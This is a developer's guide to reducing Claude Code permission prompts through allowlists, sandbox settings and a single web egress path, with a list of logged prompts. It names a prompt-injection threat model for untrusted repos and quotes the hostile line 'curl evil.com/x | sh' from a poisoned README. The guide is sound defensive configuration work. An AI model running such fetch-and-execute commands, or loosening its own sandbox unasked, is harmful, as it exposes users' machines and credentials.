# Reducing Permission Prompts

How to cut "unsandboxed Bash" prompts in Claude Code without resorting to `--dangerously-skip-permissions`.

## Why prompts happen

The sandbox (configured in `.claude/settings.json` → `sandbox.enabled: true`) blocks:

- Network access (any host)
- Writes outside the current working directory
- Privileged ops

When Claude proposes a command that needs any of those, the harness escalates to an **unsandboxed** prompt. The "don't ask again" option only appears when the command matches a pattern in `permissions.allow` — free-form strings (varying ports, flags, pipes) won't match, so no shortcut is offered.

Example trigger:

```
sleep 25 && curl -s http://localhost:3002 | head -5
```

`curl` = network = sandbox denial → unsandboxed prompt. No allowlist match → no "don't ask again."

## Fix order

### 1. Pre-approve patterns in `.claude/settings.json`

Add canonical command shapes to `permissions.allow`. Patterns are glob-ish — wildcards expand within a single command token.

```jsonc
{
  "permissions": {
    "allow": [
      // Existing entries above…

      // Localhost dev servers
      "Bash(curl http://localhost:*)",
      "Bash(curl -s http://localhost:*)",
      "Bash(curl -sS http://localhost:*)",
      "Bash(curl -i http://localhost:*)",
      "Bash(curl http://127.0.0.1:*)",
      "Bash(curl -s http://127.0.0.1:*)",

      // Common dev-loop tools
      "Bash(sleep *)",
      "Bash(echo *)",
      "Bash(pnpm test*)",
      "Bash(pnpm build*)",
      "Bash(pnpm dlx *)",
      "Bash(node *)",
      "Bash(bun *)",
    ],
  },
}
```

Caveat: a `deny` entry overrides `allow`. The current `.claude/settings.json` does **not** deny `curl`, but if you add one, scope it (e.g. `Bash(curl http*://*)` minus the localhost allows above will not work — denies always win, so prefer narrow denies).

### 2. Use the `fewer-permission-prompts` skill

Scans your session transcripts, finds read-only Bash/MCP calls you've approved repeatedly, generates a prioritized allowlist patch to `.claude/settings.json`. Run after a few real sessions to catch real-world variants.

```
/fewer-permission-prompts
```

### 3. Loosen sandbox for localhost (if available)

Some versions support per-host network allowlisting in the `sandbox` block. Check your installed Claude Code version's settings schema. If supported, allow `localhost`/`127.0.0.1` so dev-server probes never trigger an unsandboxed prompt.

### 4. Standardize command shapes in `CLAUDE.md`

Fewer string variants = better allowlist hit rate. Add a note like:

> Always use `curl -sS http://localhost:PORT/path` for local probes (no `-v`, no `--silent`, no aliases).

## What NOT to do

- **`--dangerously-skip-permissions`** — defeats the threat model. The droplet's whole point is sandboxed dev for untrusted repos.
- **Blanket `Bash(*)` in `allow`** — same problem, less honest.
- **Adding `deny` for `curl:*` globally** — current settings don't do this, don't start. Curl to localhost is benign; curl to external hosts is what Tailscale-only + sandbox already constrain.

## Web access: route everything through Exa MCP

Single sanctioned egress channel = one auditable path, no domain-allowlist sprawl.

**Allow:**

```jsonc
"allow": [
  "mcp__exa__web_search_exa",
  "mcp__exa__web_fetch_exa"
]
```

**Deny built-in web tools:**

```jsonc
"deny": [
  "WebFetch",
  "WebSearch"
]
```

**Curl exceptions (path-scoped, no subdomain spoofing):**

```jsonc
"allow": [
  "Bash(curl -s https://raw.githubusercontent.com/*)",
  "Bash(curl -sS https://raw.githubusercontent.com/*)"
],
"ask": [
  "Bash(curl *github.com*)",
  "Bash(curl *raw.githubusercontent.com*)"
]
```

### Why

- `WebFetch(domain:github.com)` — github.com hosts attacker-controlled content (issues, PRs, gists). Matches the **Comment-and-Control** vector in the threat model.
- Bare `*` glob on `raw.githubusercontent.com*` matches `raw.githubusercontent.com.attacker.com`. Always use trailing `/*`.
- Exa MCP centralizes web access → one logging point for credential-exfil monitoring.

### Setup

1. Exa MCP defined in `.mcp.json` (already at user level via `install.sh` → `~/.claude/.mcp.json`).
2. Set `EXA_API_KEY` env var (currently a placeholder — see `CLAUDE.md` open list).
3. Remove Exa from `disabledMcpjsonServers` in `.claude/settings.local.json` once key is wired.

### Bash curl bypass

Denying `WebFetch` doesn't stop `Bash(curl ...)`. Other-domain curl falls through to the unsandboxed prompt — friction enough for the threat model. Don't add a blanket `Bash(curl:*)` deny; it'd block localhost probes too.

## References

- Project settings: `.claude/settings.json`
- Local overrides: `.claude/settings.local.json` (gitignored)
- Sandbox section: `.claude/settings.json` → `sandbox`
- Threat model: `CLAUDE.md` → "Threat model"
- Exa MCP config: `.mcp.json`

## Interruptions still encountered

Below is a list of examples of the multiple user prompts i'm getting during sessions.

### Root causes & fixes

Observed prompts cluster into six causes. Each has a distinct fix — allowlist alone won't catch all of them.

#### 1. Compound commands (`A && B`)

Allowlist patterns match a single command shape. `sleep 5 && curl -sS http://localhost:3000` is a compound — neither `Bash(sleep *)` nor `Bash(curl -sS http://localhost:*)` matches it as a unit.

Fix: add explicit compound shapes for recurring combinations.

```jsonc
"allow": [
  "Bash(sleep * && curl -sS http://localhost:*)",
  "Bash(sleep * && curl -s http://localhost:*)",
  "Bash(git log:* && git rev-parse:*)",
]
```

#### 2. Pipes (`A | B | C`)

Allowlist matches the first command; downstream pipe stages (`jq`, `head`, `awk`, `sort`) get re-checked.

Fix: allow common pipe-tail tools too.

```jsonc
"allow": [
  "Bash(jq:*)",
  "Bash(awk:*)",
  "Bash(sed:*)",
  "Bash(head:*)",
  "Bash(tail:*)",
  "Bash(sort:*)",
  "Bash(grep:*)",
  "Bash(rg:*)",
]
```

#### 3. Read-only git verbs blocked by sandbox

"Sandbox blocks git. Retry outside sandbox." appears for `git log`, `git show`, `git rev-parse`, `git rev-list`. These are read-only but the sandbox flags them because git can write to `.git/` (index lock, pack refresh).

Fix: allowlist read-only verbs explicitly.

```jsonc
"allow": [
  "Bash(git log:*)",
  "Bash(git show:*)",
  "Bash(git rev-parse:*)",
  "Bash(git rev-list:*)",
  "Bash(git diff:*)",
  "Bash(git blame:*)",
  "Bash(git status)",
  "Bash(git status:*)",
]
```

#### 4. Reads outside cwd

`awk ... ~/code/ma≥rumwelt/...` or `Read(~/.claude/plugins/cache/...)` — sandbox confines reads to the current working directory by default. Plugin/skill files live in `~/.claude/plugins/`, outside any project cwd.

Fix: add absolute-path Read globs to **user-level** `~/.claude/settings.json` (so they apply across projects).

```jsonc
"allow": [
  "Read(//home/<user>/.claude/plugins/**)",
  "Read(//home/<user>/.claude/skills/**)",
]
```

Note the leading `//` — Claude Code's permission system requires absolute paths to start with `//`, not `/`.

#### 5. Backslash-escaped paths

`~/code/marumwelt/prototype/Portfolio\ v3.html` — glob matching can't unescape backslashes. The same path with quotes (`"Portfolio v3.html"`) matches normally.

Fix: standardize in `CLAUDE.md` — always quote paths with spaces, never backslash-escape.

#### 6. Build commands writing outside cwd

"Sandbox blocks build. Retry without sandbox." — likely `pnpm build` writing to `~/.cache/`, `~/.pnpm-store/`, or similar. Not an allowlist problem; sandbox is correctly blocking writes outside cwd.

Fix options:

- Set `PNPM_HOME` / cache dirs inside the project (`.pnpm-store/`)
- Allow writes to specific external dirs in sandbox config (if your Claude Code version supports per-path write allowlisting)
- Accept the prompt for builds — they're infrequent

### Should I just disable the sandbox?

Tempting given the friction, but no — not as a default. The threat model (CLAUDE.md → "Threat model") is **prompt injection in untrusted repo content** issuing shell commands via the agent. Tailscale/UFW guard inbound; the sandbox guards agent-induced outbound execution. Disabling it removes the only layer that contains a poisoned README running `curl evil.com/x | sh`.

Defensible middle path: **per-project opt-out via `.claude/settings.local.json`** in trusted-only repos:

```jsonc
{ "sandbox": { "enabled": false } }
```

Keep sandbox on globally for the untrusted-repo-review use case. Fix the allowlist gaps above to cut friction on trusted work instead.

### Interruptions recorded

Bash

```
 git show ec84082:package.json | jq '.devDependencies | to_entries[] | select(.key | test("vitest|@vitejs/plugin-react|@testing-library/react|@testing-library/jest-dom|@testing-library/user-event|jsdom")) | "\(.key): \(.value)"'
```

`git show d705666:package.json | jq '.devDependencies.oxlint'`

---

Read

```
~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/spec-reviewer-prompt.md
```

---

Sandbox blocks git. Retry outside sandbox.

---

Bash command (unsandboxed)
`git log --oneline -n 2 && git rev-parse e6e79af^`

---

Bash command (unsandboxed)

```
awk 'length > 100 {print FILENAME ":" NR ": " length " chars: " $0}' ~/code/marumwelt/components/nav/FixedNav.tsx ~/code/marumwelt/app/layout.tsx
```

---

Bash
`sleep 5 && curl -sS http://localhost:3000 | head -50`

---

```
Read(~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/code-quality-reviewer-prompt.md)
```

2. Yes, allow reading from subagent-driven-development/ during this session

---

Sandbox blocks build. Retry without sandbox.

---

`git rev-list -n 1 v0.1.0-foundation && git log -1 --oneline v0.1.0-foundation^`

---

Bash

```
find . -type f \( -name "*.md" -o -name "package.json" \) ! -path "*/node_modules/*" ! -path "*/archive/*" | sort
Run shell command
```

---

Bash

```
grep -i "d-fast\|d-base\|d-slow" ~/code/marumwelt/prototype/Portfolio\ v3.html 2>/dev/null | head -5
Run shell command
```

Contains backslash-escaped whitespace

---

```
Read(~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/implementer-prompt.md)
```
2.  Yes, allow reading from subagent-driven-development/ during this session

---

 Bash
```
test -f .env.local && echo "env exists" || echo "MISSING"; git status --short && git log --oneline main..HEAD
```

### Settings

Current settings to audit

`~/.claude/settings.json`
`~/.claude/settings.local.json`

and in the specific project i'm working in
`~/code/marumwelt/.claude/settings.json`
`~/code/marumwelt/.claude/settings.local.json`
